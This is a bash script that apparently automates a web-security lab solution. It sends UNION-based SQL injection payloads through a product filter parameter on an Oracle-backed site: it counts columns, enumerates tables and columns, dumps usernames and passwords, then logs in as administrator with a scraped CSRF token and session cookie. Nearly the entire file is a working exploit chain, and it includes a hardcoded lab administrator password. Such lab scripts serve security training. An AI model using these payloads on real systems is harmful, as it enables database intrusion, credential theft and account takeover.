#!/bin/bash

source ../common.hook

PAYLOAD=$(url_encode "/filter?category=Gifts' UNION SELECT NULL FROM DUAL-- ")

for i in {1..20}; do
    output "Trying ${PAYLOAD}" INFO
    curl "${PS_URL}${PAYLOAD}" | grep "Internal Server Error"
    if [ $(echo $?) -ne 0 ]; then
        output "Number of columns: ${i}" INFO; NUM_COLS=$i; break;
    fi

    PAYLOAD=$(url_encode "${PAYLOAD%+FROM+DUAL--+},NULL FROM DUAL-- ")
done

PAYLOAD=$(url_encode "/filter?category=Gifts' UNION SELECT 'a','b' FROM DUAL-- ")
output "Trying ${PAYLOAD}" INFO
curl "${PS_URL}${PAYLOAD}"

PAYLOAD=$(url_encode "/filter?category=Gifts' UNION SELECT table_name,NULL FROM user_tables-- ")
output "Trying ${PAYLOAD}" INFO
curl "${PS_URL}${PAYLOAD}"
TABLE="USERS_PBPSCI"
output "Users table: $TABLE" SUCCESS

PAYLOAD=$(url_encode "/filter?category=Gifts' UNION SELECT column_name,NULL FROM all_tab_cols WHERE table_name='${TABLE}'-- ")
output "Trying ${PAYLOAD}" INFO
curl "${PS_URL}${PAYLOAD}"
USERNAME_COLUMN="USERNAME_JCXQYV"
PASSWORD_COLUMN="PASSWORD_MBZQCZ"
output "Username column: ${USERNAME_COLUMN}" SUCCESS
output "Password column: ${PASSWORD_COLUMN}" SUCCESS

PAYLOAD=$(url_encode "/filter?category=Gifts' UNION SELECT ${USERNAME_COLUMN},${PASSWORD_COLUMN} FROM ${TABLE}-- ")
output "Trying ${PAYLOAD}" INFO
curl "${PS_URL}${PAYLOAD}"
USERNAME="administrator"
PASSWORD="kqylucrt45usor4c2vg8"
output "Username: ${USERNAME}" SUCCESS
output "Password: ${PASSWORD}" SUCCESS

REQUEST=$(curl -c - "${PS_URL}/login")
CSRF=$(echo ${REQUEST} | sed -n "s/.*value=\"\(\S*\)\">.*/\1/p")
COOKIE=$(echo ${REQUEST} | sed -n "s/.*session\s\(\S*\)$/\1/p")

output "Trying POST on ${PS_URL}/login with -H (${COOKIE}) -d (${CSRF}|${USERNAME}|${PASSWORD})" INFO
curl "${PS_URL}/login" -H "Cookie: session=${COOKIE}" -d "csrf=${CSRF}&username=${USERNAME}&password=${PASSWORD}" -X POST

eval_result $PS_URL
